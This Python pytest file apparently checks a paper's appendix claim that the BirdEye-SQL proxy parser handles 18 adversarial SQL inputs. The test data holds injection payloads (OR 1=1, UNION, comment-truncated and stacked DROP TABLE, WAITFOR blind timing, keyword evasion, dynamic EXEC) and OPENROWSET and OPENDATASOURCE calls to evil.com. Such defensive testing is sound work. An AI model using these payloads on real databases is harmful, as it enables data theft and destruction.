"""
test_adversarial_appendix.py — 附錄對抗性測試 18 案例自動化驗證

對應論文附錄 Table「BirdEye-SQL 對抗性測試結果（18/18 通過）」
測試依據：OWASP WSTG-INPV-05 SQL 注入分類 / CWE-89 / CAPEC-66
Mock Schema: dbo.Employee（id INT, Name NVARCHAR, Salary DECIMAL, Dept NVARCHAR）

執行方式：
    cd D:/1150322/birdeye
    python -m pytest tests/test_adversarial_appendix.py -v
"""

import io
import json
import pytest

from birdeye.runner import BirdEyeRunner
from birdeye.binder import SemanticError
from birdeye.intent_extractor import IntentExtractor

# ── Mock Schema ───────────────────────────────────────────────────────────────

EMPLOYEE_SCHEMA = (
    "table_schema,table_name,column_name,data_type\n"
    "dbo,Employee,id,INT\n"
    "dbo,Employee,Name,NVARCHAR\n"
    "dbo,Employee,Salary,DECIMAL\n"
    "dbo,Employee,Dept,NVARCHAR\n"
)

_extractor = IntentExtractor()


def _make_runner() -> BirdEyeRunner:
    """每個測試案例建立獨立 Runner，避免 Binder 狀態跨案例干擾。"""
    r = BirdEyeRunner()
    r.load_metadata_from_csv(io.StringIO(EMPLOYEE_SCHEMA))
    return r


def _run(sql: str) -> list[dict]:
    """
    執行完整 BirdEye Pipeline（Lexer → Parser → Binder → 意圖萃取）。
    對應 ZTA Proxy 實際路徑（run_multi → IntentExtractor.extract）。
    解析失敗時拋出 SyntaxError / SemanticError / ValueError。
    """
    runner = _make_runner()
    result = runner.run_multi(sql)
    ast_dict = json.loads(result["json"])
    return _extractor.extract(ast_dict)


# ── 18 Test Cases ─────────────────────────────────────────────────────────────
# 格式：(case_id, 類別, 描述, SQL, 預期結果)
# 預期結果：
#   "PARSE_ERROR" → Pipeline 應拋出例外 → Proxy 回傳 HTTP 400（fail-closed）
#   "INTENT_OK"   → Pipeline 成功執行，意圖進入授權比對流程

ADVERSARIAL_CASES = [
    # ── Unicode Evasion ───────────────────────────────────────────────────────
    # 全形 Unicode 字元不被 Lexer 視為關鍵字，被解析為 IDENTIFIER，Parser 拋出 SyntaxError
    (1,  "Unicode Evasion",     "Unicode全形關鍵字",
     "ＳＥＬＥＣＴ id FROM dbo.Employee",
     "PARSE_ERROR"),

    # 零寬字元（U+200B）在 Python isspace() 中為空白，Lexer 切分為兩段 IDENTIFIER，Parser 失敗
    (2,  "Unicode Evasion",     "零寬字元插入關鍵字",
     "SE\u200bLECT id FROM dbo.Employee",
     "PARSE_ERROR"),

    # N'' 前綴為合法 T-SQL Unicode 字串字面值，應正確解析並萃取意圖
    (3,  "Unicode Evasion",     "N' Unicode字串前綴",
     "SELECT Name FROM dbo.Employee WHERE Name = N'Alice'",
     "INTENT_OK"),

    # ── T-SQL Syntax ──────────────────────────────────────────────────────────
    # 括號識別字（Bracket Identifier）為合法 T-SQL 語法，應正確解析
    (4,  "T-SQL Syntax",        "括號識別字",
     "SELECT [Name] FROM [dbo].[Employee]",
     "INTENT_OK"),

    # [SELECT] 被 Lexer 解析為 IDENTIFIER "SELECT"（非 KEYWORD_SELECT），
    # Parser 語句分派器遇到非關鍵字 token 於語句起始位置 → SyntaxError
    (5,  "T-SQL Syntax",        "括號包覆關鍵字作欄位名",
     "[SELECT] * FROM dbo.Employee",
     "PARSE_ERROR"),

    # CTE（WITH 子句）為合法 T-SQL 語法，Binder 將 CTE 名稱加入虛擬 schema → 正確萃取意圖
    (6,  "T-SQL Syntax",        "CTE包裝查詢",
     "WITH e AS (SELECT id, Name FROM dbo.Employee) SELECT id FROM e",
     "INTENT_OK"),

    # 巢狀子查詢（衍生資料表）為合法 T-SQL 語法，內層 SELECT 意圖正確萃取
    (7,  "T-SQL Syntax",        "巢狀子查詢",
     "SELECT id FROM (SELECT id, Name FROM dbo.Employee) AS sub",
     "INTENT_OK"),

    # ── SQL Injection ─────────────────────────────────────────────────────────
    # OR 1=1 使 WHERE 恆真（Row-Level 資訊洩漏），但欄位層意圖正確萃取；
    # 欄位層 IBAC 仍有效（Salary 不在意圖清單中），Row-Level Security 由 MSSQL RLS 補充
    (8,  "SQL Injection",       "OR 1=1整數型注入",
     "SELECT Name FROM dbo.Employee WHERE id = 1 OR 1=1",
     "INTENT_OK"),

    # UNION 兩側型別不符（Name: NVARCHAR vs Salary: DECIMAL），
    # Binder 型別推導於語意層拒絕 → SemanticError（fail-closed）
    (9,  "SQL Injection",       "UNION型注入",
     "SELECT Name FROM dbo.Employee UNION SELECT Salary FROM dbo.Employee",
     "PARSE_ERROR"),

    # -- 注釋截斷惡意語句；Lexer 靜默去除注釋，截斷後之 DROP TABLE 不被執行
    (10, "SQL Injection",       "注釋截斷後跟惡意語句",
     "SELECT Name FROM dbo.Employee WHERE id = 1 -- DROP TABLE dbo.Employee",
     "INTENT_OK"),

    # SEL/**/ECT：Lexer 去除注釋後拆為 IDENTIFIER "SEL" 與 IDENTIFIER "ECT"，
    # 無法拼回 SELECT 關鍵字 → SyntaxError
    (11, "SQL Injection",       "行內注釋分割關鍵字",
     "SEL/**/ECT Name FROM dbo.Employee",
     "PARSE_ERROR"),

    # parse_script() 將兩語句解析為 ScriptNode；SELECT 萃取出 Name READ 意圖，
    # DROP 產生空意圖（不在意圖授權範疇）；整體 INTENT_OK，DDL 由 DB 層角色權限拒絕
    (12, "SQL Injection",       "堆疊查詢注入（DML+DDL）",
     "SELECT Name FROM dbo.Employee; DROP TABLE dbo.Employee",
     "INTENT_OK"),

    # WAITFOR 為 Parser 不支援之語法（已知邊界），觸發 SyntaxError → fail-closed
    (13, "SQL Injection",       "WAITFOR時間盲注",
     "WAITFOR DELAY '0:0:5'",
     "PARSE_ERROR"),

    # ── Restricted Function ───────────────────────────────────────────────────
    # OPENROWSET 在函式黑名單中，Binder._visit_expression 偵測後拋出 SemanticError
    (14, "Restricted Function", "OPENROWSET外部資料源",
     "SELECT OPENROWSET('SQLNCLI', 'Server=evil.com', 'SELECT 1')",
     "PARSE_ERROR"),

    # OPENDATASOURCE 在函式黑名單中，同上
    (15, "Restricted Function", "OPENDATASOURCE外部連線",
     "SELECT OPENDATASOURCE('SQLNCLI', 'Data Source=evil.com')",
     "PARSE_ERROR"),

    # ── Dynamic SQL ───────────────────────────────────────────────────────────
    # EXEC ('string')：_parse_full_identifier_safe() 期望 IDENTIFIER，
    # 遇到 SYMBOL_LPAREN → SyntaxError（Parser 不支援 EXEC 字串形式）
    (16, "Dynamic SQL",         "EXEC動態字串SQL",
     "EXEC ('SELECT * FROM dbo.Employee')",
     "PARSE_ERROR"),

    # sp_executesql 在預存程序封鎖清單中，Binder._bind_exec 拋出 SemanticError
    (17, "Dynamic SQL",         "sp_executesql動態SQL",
     "EXEC sp_executesql N'SELECT * FROM dbo.Employee'",
     "PARSE_ERROR"),

    # EXEC (@var)：同 case 16，括號形式觸發 SyntaxError
    (18, "Dynamic SQL",         "EXEC @變數動態SQL",
     "EXEC (@sql)",
     "PARSE_ERROR"),
]


# ── Pytest Parametrize ────────────────────────────────────────────────────────

@pytest.mark.parametrize(
    "case_id, category, desc, sql, expected",
    ADVERSARIAL_CASES,
    ids=[f"Case{c[0]:02d}-{c[2]}" for c in ADVERSARIAL_CASES],
)
def test_adversarial_case(case_id, category, desc, sql, expected):
    """
    驗證 BirdEye-SQL 對各類攻擊向量的行為符合論文附錄所宣稱的結果：
      PARSE_ERROR → Pipeline 拋出例外，Proxy 回傳 HTTP 400（fail-closed）
      INTENT_OK   → Pipeline 成功，意圖清單進入授權比對
    """
    if expected == "PARSE_ERROR":
        with pytest.raises(
            (SyntaxError, SemanticError, ValueError, RuntimeError),
            match=None,
        ):
            _run(sql)
    else:  # INTENT_OK
        intents = _run(sql)
        assert isinstance(intents, list), (
            f"Case {case_id} ({desc}): 預期回傳 intent list，實際：{type(intents)}"
        )
